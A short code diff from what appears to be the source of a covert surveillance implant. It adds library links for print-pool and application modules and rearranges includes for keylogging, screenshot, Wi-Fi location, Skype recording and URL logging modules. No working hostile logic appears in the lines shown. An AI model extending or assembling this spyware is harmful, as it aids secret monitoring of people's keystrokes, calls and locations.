@@ -96,6 +96,14 @@ void PM_MoneyRegister();
 #pragma comment(lib, "contacts")
 #endif
 
+#ifdef __ENABLE_PRINTPOOL_MODULE
+#pragma comment(lib, "printpool")
+#endif
+
+#ifdef __ENABLE_APPLICATION_MODULE
+#pragma comment(lib, "application")
+#endif
+
 /// SECTION for building modules
 
 #include <json/JSON.h>
@@ -103,7 +111,7 @@ void PM_MoneyRegister();
 #include "HM_KeyLog.h" // XXX da modificare
 #include "HM_SnapShot.h" // XXX da modificare
 #include "HM_WiFiLocation.h" // XXX da modificare
-#include "HM_PrintPool.h" // XXX da modificare 
+void PM_PrintAgentRegister();
 #include "HM_CrisisAgent.h" // XXX da modificare 
 #include "../modules/imagent/HM_SkypeRecord.h"
 #include "HM_UrlLog.h" // XXX da modificare 
@@ -115,7 +123,6 @@ extern void PM_IMRegister();	// defined in /modules/imagent
 #include "HM_LogDevice.h" // XXX da modificare 
 
 #include "HM_MouseLog.h" // XXX da modificare
-#include "HM_Application.h" // XXX da modificare
 
 void PM_SocialAgentRegister();
 
@@ -480,8 +487,6 @@ void HM_RemoveCore()
 //
 ////////////////////////////////////////////////////////////////////////////////
 ////////////////////////////////////////////////////////////////////////////////
-
-
 
 // Verifica se il processo e' nella lista dei processi da non toccare
 // Torna TRUE se il processo e' nella lista
